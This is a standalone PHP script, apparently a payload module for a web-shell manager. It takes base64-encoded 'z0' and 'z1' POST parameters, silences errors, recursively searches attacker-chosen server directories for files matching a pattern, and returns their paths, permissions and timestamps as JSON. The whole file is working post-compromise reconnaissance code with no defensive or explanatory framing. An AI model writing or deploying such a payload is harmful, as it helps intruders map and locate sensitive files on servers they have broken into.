<?php

@error_reporting(0);

function to_regex($string) {
    $string = trim($string);

    if (preg_match('/^([\/#~]).*\1[a-imsuxADSUX]*$/', $string)) {
        if (@preg_match($string, '') !== false) {
            return $string;
        }
    }

    if (strpos($string, '*') !== false || strpos($string, '?') !== false) {
        $escaped = preg_quote($string, '#');
        $regex_pattern = str_replace(['\*', '\?'], ['.*', '.'], $escaped);
        
        return '#^' . $regex_pattern . '$#i';
    }

    $has_regex_chars = preg_match('/[\.\\\\\+\*\?\^\$\[\]\(\)\{\}<>=\!\|:\-]/', $string);
    if ($has_regex_chars) {
        $test_regex = '#' . $string . '#';
        if (@preg_match($test_regex, '') !== false) {
            return $test_regex;
        }
    }

    return '#' . preg_quote($string, '#') . '#i';
}

function fnGetFilePermission($file)
{
    $perms = fileperms($file);
    switch ($perms & 0xF000) 
    {
        case 0xC000: // socket
            $info = 's';
            break;
        case 0xA000: // symbolic link
            $info = 'l';
            break;
        case 0x8000: // regular
            $info = 'r';
            break;
        case 0x6000: // block special
            $info = 'b';
            break;
        case 0x4000: // directory
            $info = 'd';
            break;
        case 0x2000: // character special
            $info = 'c';
            break;
        case 0x1000: // FIFO pipe
            $info = 'p';
            break;
        default: // unknown
            $info = 'u';
    }
    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
                (($perms & 0x0800) ? 's' : 'x' ) :
                (($perms & 0x0800) ? 'S' : '-'));

    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
                (($perms & 0x0400) ? 's' : 'x' ) :
                (($perms & 0x0400) ? 'S' : '-'));

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
                (($perms & 0x0200) ? 't' : 'x' ) :
                (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

function fnDatetimeConversion($datetime)
{
    return date("Y-m-d H:i:s", $datetime);
}

$regex = to_regex(base64_decode($_POST['z0']));
$dirs = base64_decode($_POST['z1']);

$dirs = explode(',', $dirs);
$target_dirs = [];

foreach ($dirs as $dir) {
    $dir = trim($dir);
    if (is_dir($dir)) {
        $target_dirs[] = $dir;
    }
}

if (empty($target_dirs)) {
    echo json_encode([
        'status' => false,
        'msg' => 'Cannot find any valid directory'
    ]);

    exit;
}

$results = [];
foreach ($target_dirs as $target_dir) {
    try {
        $directory = new RecursiveDirectoryIterator($target_dir, RecursiveDirectoryIterator::SKIP_DOTS);
        $iterator = new RecursiveIteratorIterator($directory);
        $regex_iterator = new RegexIterator($iterator, $regex, RegexIterator::MATCH);

        foreach ($regex_iterator as $file) {
            $real_path = $file->getRealPath();
            
            $results[] = [
                'name'          => $file->getFilename(),
                'path'          => $real_path,
                'type'          => $file->isDir() ? 'Directory' : 'File',
                'permission'    => fnGetFilePermission($real_path),
                'created'       => fnDatetimeConversion($file->getCTime()),
                'last_modified' => fnDatetimeConversion($file->getMTime()),
                'last_accessed' => fnDatetimeConversion($file->getATime())
            ];
        }
    } catch (Exception $e) {
        echo json_encode([
            'status' => false,
            'msg' => $e->getMessage()
        ]);
        exit;
    }
}

echo json_encode([
    'status' => true,
    'results' => $results
]);